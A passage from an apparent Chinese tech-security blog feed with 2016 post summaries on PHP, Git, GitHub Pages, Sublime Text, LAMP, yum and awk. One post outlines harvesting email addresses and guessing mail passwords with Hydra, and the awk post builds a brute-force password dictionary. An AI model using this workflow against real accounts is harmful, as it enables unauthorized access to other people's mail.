 &lt;/tr>
 &lt;tr>
 &lt;td>$GLOBALS&lt;/td>
 &lt;td style="text-align: left">包含一个引用指向每个当前脚本的全局范围内的有效的变量。该数组的键名为全局变量的名称&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;/li>
&lt;/ol>
&lt;h3 id="0x04-合并数组">0x04 合并数组&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>array_merge()函数将数组合并到一起，返回一个联合的数组。&lt;/p></description></item><item><title>PHP 之基础</title><link>https://wyb0.cn/posts/2016/php-basis/</link><pubDate>Sun, 15 May 2016 09:10:23 +0000</pubDate><guid>https://wyb0.cn/posts/2016/php-basis/</guid><description>&lt;h3 id="0x00-php的作用">0x00 PHP的作用&lt;/h3>
&lt;pre tabindex="0">&lt;code>1. 收集表单数据
2. 生成动态网页
3. 字符串处理
4. 动态输出图片
5. 处理服务器端文件系统
6. 编写数据库支持的网页
7. 会话跟踪控制
8. 处理XML文件
9. 支持大量的网络协议
10. 服务器端的其他相关操作
&lt;/code>&lt;/pre>&lt;h3 id="0x01-php代码嵌入位置">0x01 PHP代码嵌入位置&lt;/h3>
&lt;p>可以将PHP语言嵌入到扩展名为.php的HTML文件中的任何位置，只要在文件中使用&lt;code>&amp;quot;&amp;lt;?php&amp;quot;&lt;/code>起始符和终止符&lt;code>&amp;quot;?&amp;gt;&amp;quot;&lt;/code>就会开启PHP模式，在PHP模式中写入PHP语句即可将PHP语言嵌入到HTML文件中。&lt;/p></description></item><item><title>使用 theHarvester 得到邮箱</title><link>https://wyb0.cn/posts/2016/theharvester-blasting-email/</link><pubDate>Thu, 12 May 2016 15:27:14 +0000</pubDate><guid>https://wyb0.cn/posts/2016/theharvester-blasting-email/</guid><description>&lt;h3 id="0x00-软件">0x00 软件&lt;/h3>
&lt;pre tabindex="0">&lt;code>使用theHarvester搜集邮箱
使用dnsenum得到邮箱服务器域名
使用nmap查看端口开启情况
使用Hydra进行弱口令猜解
&lt;/code>&lt;/pre>&lt;h3 id="0x01-设置shadowsocks为全局模式">0x01 设置Shadowsocks为全局模式:&lt;/h3>
&lt;p>&lt;img src="https://wyb0.cn/img/post/SS.png" alt="设置SS为全局代理">&lt;/p></description></item><item><title>Nmap思维导图</title><link>https://wyb0.cn/posts/2016/nmap-mind-mapping/</link><pubDate>Tue, 10 May 2016 20:24:07 +0000</pubDate><guid>https://wyb0.cn/posts/2016/nmap-mind-mapping/</guid><description>&lt;h3 id="nmap思维导图如下">nmap思维导图如下：&lt;/h3>
&lt;p>&lt;img src="https://wyb0.cn/img/post/nmap.png" alt="nmap思维导图">&lt;/p></description></item><item><title>通过 gh-pages 发布博客</title><link>https://wyb0.cn/posts/2016/ubuntu-push-blog-to-github/</link><pubDate>Mon, 09 May 2016 23:33:12 +0000</pubDate><guid>https://wyb0.cn/posts/2016/ubuntu-push-blog-to-github/</guid><description>&lt;p>环境：Ubuntu 14.4&lt;/p>
&lt;h3 id="0x00-添加密钥">0x00 添加密钥&lt;/h3>
&lt;pre tabindex="0">&lt;code>➜ ssh-keygen -t rsa -b 2048 -C &amp;#34;123456@qq.com&amp;#34; -f id_rsa_github # 生成密钥
➜ cd ~/.ssh/
➜ cat id_rsa_github.pub # 将公钥添加到 github

➜ git config --global user.name &amp;#34;reber&amp;#34; # 配置本地用户
➜ git config --global user.email &amp;#34;123456@qq.com&amp;#34; # 配置本地邮箱

➜ ssh -T git@github.com # 验证密钥是否添加成功
&lt;/code>&lt;/pre>&lt;h3 id="0x01-gh-pages">0x01 gh-pages&lt;/h3>
&lt;p>Github 创建项目仓库后会产生一个 main 分支，只需要再添加 gh-pages 分支就可以创建静态页面了&lt;/p></description></item><item><title>Ubuntu 下安装 sublime text 3</title><link>https://wyb0.cn/posts/2016/ubuntu-insatll-sublime-text3/</link><pubDate>Sun, 08 May 2016 00:04:42 +0000</pubDate><guid>https://wyb0.cn/posts/2016/ubuntu-insatll-sublime-text3/</guid><description>&lt;p>环境：ubuntu14.4&lt;/p>
&lt;h3 id="0x00-安装">0x00 安装&lt;/h3>
&lt;ol>
&lt;li>
&lt;p>添加Sublime Text 3的仓库&lt;br>
sudo add-apt-repository ppa:webupd8team/sublime-text-3&lt;/p>
&lt;/li>
&lt;li>
&lt;p>更新软件库&lt;br>
sudo apt-get update&lt;/p>
&lt;/li>
&lt;li>
&lt;p>安装Sublime Text 3&lt;br>
sudo apt-get install sublime-text-installer&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h3 id="0x01-解决不能输入中文的问题">0x01 解决不能输入中文的问题&lt;/h3>
&lt;ol>
&lt;li>新建sublime_imfix.c(位于～目录)，写入如下内容&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;gtk/gtkimcontext.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">gtk_im_context_set_client_window&lt;/span> (GtkIMContext &lt;span style="color:#f92672">*&lt;/span>context,GdkWindow &lt;span style="color:#f92672">*&lt;/span>window)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>GtkIMContextClass &lt;span style="color:#f92672">*&lt;/span>klass;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">g_return_if_fail&lt;/span> (&lt;span style="color:#a6e22e">GTK_IS_IM_CONTEXT&lt;/span> (context));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>klass &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">GTK_IM_CONTEXT_GET_CLASS&lt;/span> (context);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> (klass&lt;span style="color:#f92672">-&amp;gt;&lt;/span>set_client_window)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> klass&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">set_client_window&lt;/span> (context, window);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">g_object_set_data&lt;/span>(&lt;span style="color:#a6e22e">G_OBJECT&lt;/span>(context),&lt;span style="color:#e6db74">&amp;#34;window&amp;#34;&lt;/span>,window);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#a6e22e">GDK_IS_WINDOW&lt;/span> (window))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> width &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">gdk_window_get_width&lt;/span>(window);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> height &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">gdk_window_get_height&lt;/span>(window);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span>(width &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> height &lt;span style="color:#f92672">!=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">gtk_im_context_focus_in&lt;/span>(context);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
&lt;li>将上一步的代码编译成共享库libsublime-imfix.so&lt;/li>
&lt;/ol>
&lt;pre tabindex="0">&lt;code>cd ~ 
sudo apt-get install gtk+-2.0 
gcc -shared -o libsublime-imfix.so sublime_imfix.c `pkg-config --libs --cflags gtk+-2.0` -fPIC
&lt;/code>&lt;/pre>&lt;ol start="3">
&lt;li>
&lt;p>将libsublime-imfix.so拷贝到sublime_text所在文件夹&lt;br>
&lt;code>sudo mv libsublime-imfix.so /opt/sublime_text/&lt;/code>&lt;/p></description></item><item><title>Ubuntu 搭建 LAMP</title><link>https://wyb0.cn/posts/2016/ubuntu-build-lamp/</link><pubDate>Sat, 07 May 2016 21:37:07 +0000</pubDate><guid>https://wyb0.cn/posts/2016/ubuntu-build-lamp/</guid><description>&lt;h3 id="0x00-环境">0x00 环境&lt;/h3>
&lt;p>我是在虚拟机中安装14.04.4版的Ubuntu &lt;a href="http://mirrors.163.com/ubuntu-releases/14.04.4/ubuntu-14.04.4-desktop-amd64.iso">下载Ubuntu14.04.4&lt;/a>&lt;/p>
&lt;h3 id="0x01-配源或选择最快的更新服务器">0x01 配源或选择最快的更新服务器&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>选择最快的更新服务器:&lt;br>
System Settings &amp;ndash;&amp;gt; Software &amp;amp; Updates &amp;ndash;&amp;gt; Download from:other &amp;ndash;&amp;gt; Select Best Server &amp;ndash;&amp;gt; Choose Serve &amp;ndash;&amp;gt; Close&lt;/p></description></item><item><title>Git 的用法</title><link>https://wyb0.cn/posts/2016/git-usage/</link><pubDate>Thu, 05 May 2016 00:00:00 +0000</pubDate><guid>https://wyb0.cn/posts/2016/git-usage/</guid><description>&lt;h3 id="0x00-仓库">0x00 仓库&lt;/h3>
&lt;ul>
&lt;li>创建仓库
&lt;ul>
&lt;li>git init&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>克隆
&lt;ul>
&lt;li>git clone &lt;a href="mailto:git@github.com">git@github.com&lt;/a>:reber0/wyb0.com.git&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>添加远程仓库连接
&lt;ul>
&lt;li>git remote add origin &lt;a href="mailto:git@github.com">git@github.com&lt;/a>:reber/reber.com.git&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>删除远程仓库信息
&lt;ul>
&lt;li>git remote rm origin&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="0x01-添加-ssh-key">0x01 添加 SSH key&lt;/h3>
&lt;p>生成 key&lt;/p>
&lt;pre tabindex="0">&lt;code>➜ ssh-keygen -t rsa -b 2048 -f id_rsa_github -C &amp;#34;123456@qq.com&amp;#34;
&lt;/code>&lt;/pre>&lt;p>将 ~/.ssh/ 下生成的 id_rsa_github.pub 的内容添加到 github&lt;/p></description></item><item><title>Linux 之文本处理软件 awk</title><link>https://wyb0.cn/posts/2016/linux-text-processing-software-awk/</link><pubDate>Wed, 20 Apr 2016 15:54:07 +0000</pubDate><guid>https://wyb0.cn/posts/2016/linux-text-processing-software-awk/</guid><description>&lt;p>awk默认是以行为单位处理文本的，对文本中的每一行都执行后面 &amp;ldquo;{ }&amp;rdquo; 中的语句。&lt;/p>
&lt;h3 id="0x00-awk">0x00 awk&lt;/h3>
&lt;ul>
&lt;li>若有一个需要重新格式化的字典test.txt(用户名、密码、地址)：&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>xiaosan sadasdw jiaozuo
234wer asdfasd asdas
1111 aaaa cccc
2222 aaaa degd
1111 aaaa cccc
3333 aaaa dfger
21asd sdfsd sadasd
dwqx asds sasdfcv
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>要求：&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>1.里面有重复数据，使用命令去重
2.提取出用户名和密码 每一行前面加上id数字，递增。
3.只提取出密码作为爆破字典
4.某些公司都是一个公司前缀+姓名简写，所以为用户名一栏全部改为uv_用户名
5.提取出密码一列，有些密码爆破成功率高，所以增加一列，标出密码出现次数
&lt;/code>&lt;/pre>&lt;h3 id="0x01-去重">0x01 去重&lt;/h3>
&lt;pre tabindex="0">&lt;code>$ cat test.txt | awk &amp;#39;!a[$1]++&amp;#39;
$ cat test.txt | uniq #作用和上面命令相同
xiaosan sadasdw jiaozuo
234wer asdfasd asdas
1111 aaaa cccc
2222 aaaa degd
3333 aaaa dfger
21asd sdfsd sadasd
dwqx asds sasdfcv
&lt;/code>&lt;/pre>&lt;h3 id="0x02-去重添加id">0x02 去重、添加id&lt;/h3>
&lt;pre tabindex="0">&lt;code>一般字典不需要id、user、pass等标示符，这里只是为了便于观看

$ cat test.txt | awk &amp;#39;!a[$1]++&amp;#39; | awk -F &amp;#39;\t&amp;#39; &amp;#39;{print &amp;#34;id:&amp;#34;NR&amp;#34;\tuser:&amp;#34;$1&amp;#34;\tpass:&amp;#34;$2&amp;#34;\taddress:&amp;#34;$3}&amp;#39; | column -t #最后一个命令可以将列对齐
id:1 user:aosan pass:sadasdw address:jiaozuo
id:2 user:234wer pass:asdfasd address:asdas
id:3 user:1111 pass:aaaa address:cccc
id:4 user:2222 pass:aaaa address:degd
id:5 user:3333 pass:aaaa address:dfger
id:6 user:21asd pass:sdfsd address:sadasd
id:7 user:dwqx pass:asds address:sasdfcv
&lt;/code>&lt;/pre>&lt;h3 id="0x03-去重添加id添加公司前缀">0x03 去重、添加id、添加公司前缀&lt;/h3>
&lt;pre tabindex="0">&lt;code>$ cat test.txt | awk &amp;#39;!a[$1]++&amp;#39; | awk -F &amp;#39;\t&amp;#39; &amp;#39;{print &amp;#34;id:&amp;#34;NR&amp;#34;\tuser:uv_&amp;#34;$1&amp;#34;\tpass:&amp;#34;$2&amp;#34;\taddress:&amp;#34;$3}&amp;#39;
id:1 user:uv_aosan pass:sadasdw address:jiaozuo
id:2 user:uv_234wer pass:asdfasd address:asdas
id:3 user:uv_1111 pass:aaaa address:cccc
id:4 user:uv_2222 pass:aaaa address:degd
id:5 user:uv_3333 pass:aaaa address:dfger
id:6 user:uv_21asd pass:sdfsd address:sadasd
id:7 user:uv_dwqx pass:asds address:sasdfcv
&lt;/code>&lt;/pre>&lt;h3 id="0x04-去重然后输出密码">0x04 去重然后输出密码&lt;/h3>
&lt;pre tabindex="0">&lt;code>$ cat test.txt | awk &amp;#39;!a[$1]++&amp;#39; | awk -F &amp;#39;\t&amp;#39; &amp;#39;{print &amp;#34;pass:&amp;#34;$2}&amp;#39;
pass:sadasdw
pass:asdfasd
pass:aaaa
pass:aaaa
pass:aaaa
pass:sdfsd
pass:asds
&lt;/code>&lt;/pre>&lt;h3 id="0x05-输出密码得到密码出现次数">0x05 输出密码、得到密码出现次数&lt;/h3>
&lt;pre tabindex="0">&lt;code>下面的&amp;#39;a[$1]++&amp;#39;是按第一列来去重的,若有两条数据只有第一列重复则成功，可以用$0按行来去重
$ cat test.txt | awk &amp;#39;!a[$1]++&amp;#39; | awk -F &amp;#39;\t&amp;#39; &amp;#39;{print $2}&amp;#39; | awk &amp;#39;{a[$1]++} END {for (j in a) print a[j],j}&amp;#39;
1 sadasdw
1 sdfsd
1 asdfasd
1 asds
3 aaaa

uniq 只能去除挨着的重复数据，所以先sort升序排序，然后uniq -c统计重复，再sort -r降序排序
cat test.txt | awk &amp;#39;{print $2}&amp;#39; | sed &amp;#39;1d&amp;#39; |sort | uniq -c |sort -r
&lt;/code>&lt;/pre>&lt;h3 id="0x06-其他">0x06 其他：&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>对!a[$1]++的解释如下：&lt;/p></description></item><item><title>Linux 之文本处理</title><link>https://wyb0.cn/posts/2016/linux-text-processing/</link><pubDate>Wed, 20 Apr 2016 07:58:07 +0000</pubDate><guid>https://wyb0.cn/posts/2016/linux-text-processing/</guid><description>&lt;p>这里介绍3种方式：awk、grep、sed&lt;/p>
&lt;h3 id="0x00-awk处理文本最常用">0x00 awk处理文本(最常用)&lt;/h3>
&lt;pre tabindex="0">&lt;code>作用：awk对数据以行分析并生成报告时显得很强大，它将行进行切片，再处理分开的切片，可对格式化的数据重新进行格式化 
awk命令格式：awk [F filed-separator] &amp;#39;commands&amp;#39; input-fiel(s) 
参数-F：可以添加任意的分割符，比较重要 
awk工作流程是这样的： 
读入有&amp;#39;\n&amp;#39;换行符分割的一条记录，然后将记录按-F指定的域分隔符划分域，$0则表示所有域,$1表示第一个域,$n表示第n个域。默认域分隔符是&amp;#34;空白键&amp;#34; 或 &amp;#34;[tab]键&amp;#34;。
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>入门示例：&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>wyb@localhost temp&lt;span style="color:#f92672">]&lt;/span>$ head -n &lt;span style="color:#ae81ff">5&lt;/span> /etc/passwd
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>root:x:0:0:root:/root:/bin/bash
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>bin:x:1:1:bin:/bin:/sbin/nologin
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>daemon:x:2:2:daemon:/sbin:/sbin/nologin
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>adm:x:3:4:adm:/var/adm:/sbin/nologin
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>wyb@localhost temp&lt;span style="color:#f92672">]&lt;/span>$ head -n &lt;span style="color:#ae81ff">5&lt;/span> /etc/passwd | awk -F &lt;span style="color:#e6db74">&amp;#39;:&amp;#39;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;{print $1}&amp;#39;&lt;/span> &lt;span style="color:#75715e">#输出第1列，域分隔符为：&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>root
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>bin
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>daemon
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>adm
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>lp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>wyb@localhost temp&lt;span style="color:#f92672">]&lt;/span>$ head -n &lt;span style="color:#ae81ff">5&lt;/span> /etc/passwd | awk -F &lt;span style="color:#e6db74">&amp;#39;:&amp;#39;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;{pri
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">nt &amp;#34;id:&amp;#34;$1&amp;#34;\tshell:&amp;#34;$7}&amp;#39;&lt;/span> &lt;span style="color:#75715e">#输出第1、7列且给予列名&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>id:root shell:/bin/bash
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>id:bin shell:/sbin/nologin
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>id:daemon shell:/sbin/nologin
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>id:adm shell:/sbin/nologin
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>id:lp shell:/sbin/nologin
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>wyb@localhost temp&lt;span style="color:#f92672">]&lt;/span>$ head -n &lt;span style="color:#ae81ff">5&lt;/span> /etc/passwd | awk -F &lt;span style="color:#e6db74">&amp;#39;:&amp;#39;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;BEGIN {print &amp;#34;====begin=====&amp;#34;} {print &amp;#34;id:&amp;#34;$1&amp;#34;\tshell:&amp;#34;$7} END {print &amp;#34;====end====&amp;#34;}&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">====&lt;/span>begin&lt;span style="color:#f92672">=====&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>id:root shell:/bin/bash
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>id:bin shell:/sbin/nologin
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>id:daemon shell:/sbin/nologin
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>id:adm shell:/sbin/nologin
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>id:lp shell:/sbin/nologin
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">====&lt;/span>end&lt;span style="color:#f92672">====&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>wyb@localhost temp&lt;span style="color:#f92672">]&lt;/span>$ awk -F: &lt;span style="color:#e6db74">&amp;#39;/root/&amp;#39;&lt;/span> /etc/passwd &lt;span style="color:#75715e">#搜索含有root关键字的所有行&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>root:x:0:0:root:/root:/bin/bash
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>operator:x:11:0:operator:/root:/sbin/nologin
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>wyb@localhost temp&lt;span style="color:#f92672">]&lt;/span>$ awk -F: &lt;span style="color:#e6db74">&amp;#39;/root/{print $7}&amp;#39;&lt;/span> /etc/passwd &lt;span style="color:#75715e">#匹配root并输出对应shell&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>/bin/bash
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>/sbin/nologin
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>wyb@localhost temp&lt;span style="color:#f92672">]&lt;/span>$ awk -F: &lt;span style="color:#e6db74">&amp;#39;/^root/&amp;#39;&lt;/span> /etc/passwd &lt;span style="color:#75715e">#匹配以root开头的行&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>root:x:0:0:root:/root:/bin/bash
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>内置变量：&lt;/li>
&lt;/ul>
&lt;table>
 &lt;tr>
 &lt;td bgcolor=black>
ARGC&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;命令行参数个数&lt;br/>
ARGV&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;命令行参数排列&lt;br/>
ENVIRON&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;支持队列中系统环境变量的使用&lt;br/>
FILENAME&amp;nbsp;&amp;nbsp;&amp;nbsp;awk浏览的文件名&lt;br/>
FNR&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;浏览文件的记录数&lt;br/>
FS&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;设置输入域分隔符，等价于命令行 -F选项&lt;br/>
NF&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;浏览记录的域的个数&lt;br/>
NR&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;已读的记录数&lt;br/>
OFS&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;输出域分隔符&lt;br/>
ORS&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;输出记录分隔符&lt;br/>
RS&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;控制记录分隔符
 &lt;/td>
 &lt;/tr>
&lt;/table>
```
[wyb@localhost temp]$ awk -F: '{print "filename:" FILENAME ",linenumber:" NR ",columns:" NF ",linecontent:"$0}' a.txt
filename:a.txt,linenumber:1,columns:1,linecontent:1 root 12sf34s56
filename:a.txt,linenumber:2,columns:1,linecontent:2 admin ksdjfiweurf
filename:a.txt,linenumber:3,columns:1,linecontent:3 dome skd89453
filename:a.txt,linenumber:4,columns:1,linecontent:4 tomkd 3jkke34
filename:a.txt,linenumber:5,columns:1,linecontent:5 jarry sdkj89ry4
filename:a.txt,linenumber:6,columns:1,linecontent:6 canki sdkj834
filename:a.txt,linenumber:7,columns:1,linecontent:7 lola er8f7734
filename:a.txt,linenumber:8,columns:1,linecontent:8 marry j8jkf78
filename:a.txt,linenumber:9,columns:1,linecontent:9 candy kd89943
```
&lt;ul>
&lt;li>
&lt;p>awk编程：&lt;/p></description></item><item><title>Linux 之软件的安装</title><link>https://wyb0.cn/posts/2016/linux-software-installation/</link><pubDate>Tue, 19 Apr 2016 19:07:07 +0000</pubDate><guid>https://wyb0.cn/posts/2016/linux-software-installation/</guid><description>&lt;p>Linux上的软件安装可以分为三种方式：&lt;/p>
&lt;h3 id="0x00-yum安装">0x00 yum安装&lt;/h3>
&lt;pre tabindex="0">&lt;code>yum基于RPM包管理，一次性安装所有依赖包，提供了查找、安装、删除一个、一组
至全部软件包的命令，配置文件在/etc/yum.repos.d/下
主要命令：
yum install gcc g++
yum remove wget
yum list installed //显示已经安装过的软件
yum list //显示所有可以安装的包
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>[wyb@localhost ~]$ wget -h //验证有没有安装wget
-bash: /usr/bin/wget: No such file or directory
[wyb@localhost ~]$ sudo yum search wget //通过yum查找wget，看有没有这个软件包
Loaded plugins: fastestmirror, refresh-packagekit, security
Loading mirror speeds from cached hostfile
 * base: mirrors.yun-idc.com
 * extras: mirrors.pubyun.com
 * updates: mirrors.yun-idc.com
============================== N/S Matched: wget ===============================
wget.x86_64 : A utility for retrieving files using the HTTP or FTP protocols

 Name and summary matches only, use &amp;#34;search all&amp;#34; for everything.
[wyb@localhost ~]$ sudo yum deplist wget //列出安装包的依赖项
Loaded plugins: fastestmirror, refresh-packagekit, security
Loading mirror speeds from cached hostfile
 * base: mirrors.yun-idc.com
 * extras: mirrors.pubyun.com
 * updates: mirrors.yun-idc.com
Finding dependencies: 
package: wget.x86_64 1.12-5.el6_6.1
 dependency: libssl.so.10()(64bit)
 provider: openssl.x86_64 1.0.1e-42.el6
 provider: openssl.x86_64 1.0.1e-42.el6_7.1
 provider: openssl.x86_64 1.0.1e-42.el6_7.2
 provider: openssl.x86_64 1.0.1e-42.el6_7.4
[wyb@localhost ~]$ sudo yum install wget //安装一个或两个软件包
Loaded plugins: fastestmirror, refresh-packagekit, security
Loading mirror speeds from cached hostfile
 * base: mirrors.yun-idc.com
 * extras: mirrors.pubyun.com
 * updates: mirrors.yun-idc.com
Setting up Install Process
Resolving Dependencies
--&amp;gt; Running transaction check
---&amp;gt; Package wget.x86_64 0:1.12-5.el6_6.1 will be installed
--&amp;gt; Finished Dependency Resolution
[wyb@localhost ~]$ sudo yum remove wget //移除wget
[sudo] password for wyb: 
Loaded plugins: fastestmirror, refresh-packagekit, security
Setting up Remove Process
Resolving Dependencies
--&amp;gt; Running transaction check
---&amp;gt; Package wget.x86_64 0:1.12-5.el6_6.1 will be erased
--&amp;gt; Finished Dependency Resolution
&lt;/code>&lt;/pre>&lt;h3 id="0x01-rpm安装">0x01 rpm安装&lt;/h3>
&lt;p>分为：二进制包和源代码包&lt;br>
二进制包可直接安装，源码包会由rpm自动编译、安装，安装包常以src、rpm做为后缀&lt;/p></description></item><item><title>Linux 之基础命令</title><link>https://wyb0.cn/posts/2016/linux-basic-command/</link><pubDate>Tue, 19 Apr 2016 10:03:07 +0000</pubDate><guid>https://wyb0.cn/posts/2016/linux-basic-command/</guid><description>&lt;h3 id="0x00-ls显示文件">0x00 ls：显示文件&lt;/h3>
